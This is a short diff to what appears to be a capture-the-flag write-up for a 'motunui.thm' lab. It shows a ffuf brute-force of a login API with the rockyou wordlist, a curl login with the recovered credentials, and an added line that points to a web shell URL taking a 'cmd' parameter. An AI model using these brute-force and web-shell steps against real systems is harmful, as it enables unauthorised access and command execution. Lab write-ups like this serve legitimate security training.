@@ -10,3 +10,4 @@ ffuf -w /opt/rockyou.txt -u http://api.motunui.thm:3000/v2/login -X POST -H "Con
 ```
 curl -d '{"username":"maui","password":"island"}' -H 'Content-Type: application/json' http://api.motunui.thm:3000/v2/login
 ```
+> then go to http://example.com/shell.php?cmd=`<exec>`
